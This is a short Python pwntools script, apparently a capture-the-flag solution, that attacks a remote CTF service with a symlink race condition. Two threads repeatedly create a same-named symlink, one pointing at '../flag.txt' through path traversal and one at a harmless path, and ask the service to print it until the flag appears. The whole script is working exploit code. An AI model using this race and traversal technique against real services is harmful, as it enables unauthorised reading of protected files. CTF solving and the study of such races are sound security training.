#!/usr/bin/python3

from pwn import *
import threading

# Flag to indicate when to stop the threads
stop_threads = False

def establish_connection(directory_hash):
    connection = remote("ctf99.cs.ui.ac.id", 10007)
    connection.sendlineafter(b": ", b"y") 
    connection.sendlineafter(b": ", directory_hash)
    return connection

def create_symlink(connection, target_path, symlink_name):
    connection.sendline(b"1") 
    connection.sendlineafter(b": ", target_path) 
    connection.sendlineafter(b": ", symlink_name) 

def output_symlink(connection, symlink_hash):
    connection.sendlineafter(b"> ", b"2") 
    connection.sendlineafter(b": ", symlink_hash) 

def solver(target_path, directory_hash, symlink_name, symlink_hash):
    global stop_threads
    connection = establish_connection(directory_hash)

    while not stop_threads:
        output = connection.recvuntil(b"> ") 
        print(output) 
        if b"CSCE" in output:
            stop_threads = True
            break

        create_symlink(connection, target_path, symlink_name)
        output_symlink(connection, symlink_hash)

# Create two threads and start them
thread_for_flag = threading.Thread(target=solver, args=(b"../flag.txt", b"/bd71446ac97219126fe9adea41de4b1532c4c783a87bdf6387e161759bff4172", b"abcdefghij", b"c4f6fa010f"))
thread_for_random_path = threading.Thread(target=solver, args=(b"abcdef", b"/bd71446ac97219126fe9adea41de4b1532c4c783a87bdf6387e161759bff4172", b"abcdefghij", b"c4f6fa010f"))

thread_for_flag.start()
thread_for_random_path.start()

# Wait for both threads to finish
thread_for_flag.join()
thread_for_random_path.join()
